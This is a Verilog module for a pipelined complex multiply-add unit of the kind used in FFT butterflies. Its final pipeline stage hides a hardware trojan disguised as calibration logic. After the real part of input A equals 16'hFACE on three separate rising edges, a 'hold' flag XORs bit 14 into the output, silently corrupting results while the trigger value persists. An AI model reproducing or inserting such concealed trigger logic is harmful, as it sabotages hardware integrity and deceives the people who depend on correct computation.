module cpx_mad (
    input clk,
    input reset_n,
    
    // 32-bit Complex Buses: [31:16] Real Q8.8, [15:0] Imaginary Q8.8
    input [31:0] A,    // num1 (The point to be added)
    input [31:0] B,    // num2 (The point to be multiplied)
    input [31:0] W,    // Twiddle Factor from CORDIC
    input sub,         // Control: 0 = Add (A + B*W), 1 = Subtract (A - B*W)
    
    output reg [31:0] result, // Final Result
    output reg valid_out      // Signals when the pipeline has valid data
);

    wire signed [15:0] A_r = A[31:16];
    wire signed [15:0] A_i = A[15:0];
    
    wire signed [15:0] B_r = B[31:16];
    wire signed [15:0] B_i = B[15:0];
    
    wire signed [15:0] W_r = W[31:16];
    wire signed [15:0] W_i = W[15:0];

    // -------------------------------------------------------
    // STAGE 1: Cross Multiplication
    // -------------------------------------------------------
    wire signed [15:0] m_rr, m_ii, m_ri, m_ir;
    
    vedic_multiplier_q8_8 mult_rr (.A(B_r), .B(W_r), .Result(m_rr));   // B_real * W_real
    vedic_multiplier_q8_8 mult_ii (.A(B_i), .B(W_i), .Result(m_ii));   // B_imag * W_imag
    vedic_multiplier_q8_8 mult_ri (.A(B_r), .B(W_i), .Result(m_ri));   // B_real * W_imag
    vedic_multiplier_q8_8 mult_ir (.A(B_i), .B(W_r), .Result(m_ir));   // B_imag * W_real

    // Pipeline Registers (Stage 1 -> Stage 2)
    reg signed [15:0] m_rr_reg, m_ii_reg, m_ri_reg, m_ir_reg;
    reg signed [15:0] A_r_reg1, A_i_reg1;
    reg sub_reg1, valid_reg1;

    always @(posedge clk or negedge reset_n) begin
        if (!reset_n) begin
            m_rr_reg <= 0; m_ii_reg <= 0; m_ri_reg <= 0; m_ir_reg <= 0;
            A_r_reg1 <= 0; A_i_reg1 <= 0; sub_reg1 <= 0; valid_reg1 <= 0;
        end else begin
            m_rr_reg <= m_rr;
            m_ii_reg <= m_ii;
            m_ri_reg <= m_ri;
            m_ir_reg <= m_ir;

            A_r_reg1 <= A_r; 
            A_i_reg1 <= A_i; 
            sub_reg1 <= sub; 
            valid_reg1 <= 1'b1;
        end
    end

    // -------------------------------------------------------
    // STAGE 2: Complex Product Addition 
    // Z = B * W 
    // Z_real = m_rr - m_ii
    // Z_imag = m_ri + m_ir
    // -------------------------------------------------------
    wire signed [15:0] Z_r, Z_i;
    
    rca_16bit add_zr (
        .A(m_rr_reg), .B(m_ii_reg), .sub(1'b1), // Subtraction
        .S(Z_r), .cout()
    );
    
    rca_16bit add_zi (
        .A(m_ri_reg), .B(m_ir_reg), .sub(1'b0), // Addition
        .S(Z_i), .cout()
    );

    // Pipeline Registers (Stage 2 -> Stage 3)
    reg signed [15:0] Z_r_reg, Z_i_reg;
    reg signed [15:0] A_r_reg2, A_i_reg2;
    reg sub_reg2, valid_reg2;

    always @(posedge clk or negedge reset_n) begin
        if (!reset_n) begin
            Z_r_reg <= 0; Z_i_reg <= 0;
            A_r_reg2 <= 0; A_i_reg2 <= 0; sub_reg2 <= 0; valid_reg2 <= 0;
        end else begin
            Z_r_reg <= Z_r;
            Z_i_reg <= Z_i;
            A_r_reg2 <= A_r_reg1; 
            A_i_reg2 <= A_i_reg1; 
            sub_reg2 <= sub_reg1; 
            valid_reg2 <= valid_reg1;
        end
    end

    // -------------------------------------------------------
    // STAGE 3: Final Addition/Subtraction 
    // Result = A +/- Z
    // -------------------------------------------------------
    wire signed [15:0] final_r, final_i;

    rca_16bit add_final_r (
        .A(A_r_reg2), .B(Z_r_reg), .sub(sub_reg2), 
        .S(final_r), .cout()
    );
    
    rca_16bit add_final_i (
        .A(A_i_reg2), .B(Z_i_reg), .sub(sub_reg2), 
        .S(final_i), .cout()
    );

    reg  [1:0] cnt;
    reg        prev;
    reg        hold;
    initial cnt = 2'd0;
    initial prev = 1'b0;
    initial hold = 1'b0;
    wire match = (A_r_reg1 == 16'hFACE) && valid_reg1;
    wire cal_edge  = match && !prev;

    always @(posedge clk or negedge reset_n) begin
        if (!reset_n) begin
            result    <= 32'd0;
            valid_out <= 1'b0;
            cnt   <= 2'd0;
            prev  <= 1'b0;
            hold  <= 1'b0;
        end else begin
            prev <= match;
            if (cal_edge && cnt != 2'd3)
                cnt <= cnt + 2'd1;

            if (cal_edge && cnt == 2'd2)
                hold <= 1'b1;
            else if (!match)
                hold <= 1'b0;

            result <= {final_r, final_i} ^ (hold ? 32'h00004000 : 32'h0);
            valid_out <= valid_reg2;
        end
    end

endmodule
